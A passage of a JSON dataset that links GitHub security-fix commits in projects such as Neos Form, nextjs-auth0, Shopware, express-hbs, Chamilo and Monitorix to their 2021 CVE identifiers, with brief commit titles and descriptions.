  "546cdd981dc7078a4baf75827b57e386fa104a6dfdf660b0c8cfe8b81916c3d0": {
    "url": "https://github.com/neos/form/commit/049d415295be8d4a0478ccba97dba1bb81649567",
    "title": "[BUGFIX] fix reconstituting a form from its internal state",
    "body": "This is an edge case which is only exposed when persisting the formStatein e.g. a database, and accessing it with GET requests as well.Change-Id: Ib3d24628f10160f2c170d01fc3daab873595a292Releases: master",
    "cveIds": [
      "CVE-2021-32697"
    ],
    "cveIdsCount": 1
  },
  "546315856bb9e6d1ea1fe7ce5eecdebf14cbb85484fb1664ef4b11519bf2c773": {
    "url": "https://github.com/auth0/nextjs-auth0/commit/6996e2528ceed98627caa28abafbc09e90163ccf",
    "title": "Merge pull request from GHSA-954c-jjx6-cxv7",
    "body": "Fix reflected XSS from the callback handler's error query parameter",
    "cveIds": [
      "CVE-2021-32702"
    ],
    "cveIdsCount": 1
  },
  "615a8d6bdc93f8af629a287243b796e8b74385963ec282d6d6255bb5349eaab4": {
    "url": "https://github.com/shopware/shopware/commit/a0850ffbc6f581a8eb8425cc2bf77a0715e21e12",
    "title": "Merge branch 'sw-26050/5.6/dev' into '5.6'",
    "body": "SW-26050 - Adjust product name renderingSee merge request shopware/5/product/shopware!534",
    "cveIds": [
      "CVE-2021-32713"
    ],
    "cveIdsCount": 1
  },
  "7533491b74eef9d9f03b8fe41f4c6b65cb6190fcc65fab75881a195701bc5608": {
    "url": "https://github.com/TryGhost/express-hbs/commit/ff6fad6e357699412d4e916273314e5e7af1500e",
    "title": "🔒 Added notes on a potential security vulnerability",
    "body": "- Express.js never intended for template options to be passed via res.render- If you use res.render to pass a layout, the file will be read from disk- If you pass user-submitted data as options to res.render e.g. using req.query, then user-submitted file paths will be read- This is only a potential security vulnerability, depending on the implementation- Further fixes will be pushed to express-hbs to disable this behaviour by default",
    "cveIds": [
      "CVE-2021-32817"
    ],
    "cveIdsCount": 1
  },
  "bf77a659809ad1b29018cf1a844eb893c0f305f168c9e5effc128c6b3d0b586a": {
    "url": "https://github.com/chamilo/chamilo-lms/commit/e71437c8de809044ba3ae1b181d70857c050a3e9",
    "title": "Fix XML import user_import.php results page",
    "body": "Add new function Import:xml and use libxml_disable_entity_loaderMove code into a function",
    "cveIds": [
      "CVE-2021-32925"
    ],
    "cveIdsCount": 1
  },
  "938fbe507d58fbd8771b387f3c191d16b502294959b3b1be1256c4eeb30020e7": {
    "url": "https://github.com/mikaku/Monitorix/commit/d6816e20da1a98bcdc6372d9c36a093df5238f4a",
    "title": "fixed a security bug introduced in 3.13.0 version that lead the HTTP …",
    "body": "…built-in server to bypass Basic Authentication when the option 'hosts_deny' is not defined #309",
    "cveIds": [
      "CVE-2021-3325"
    ],
    "cveIdsCount": 1
  },
  "1da76329206ba0918f97b863e95d4cdb99f03344e52477364fb67bf3ec7f0ca7": {
    "url": "https://github.com/EyesOfNetworkCommunity/eonweb/releases",
    "title": "",
    "body": "Adding Release name",
    "cveIds": [
      "CVE-2021-33525"
    ],
    "cveIdsCount": 1
  }
}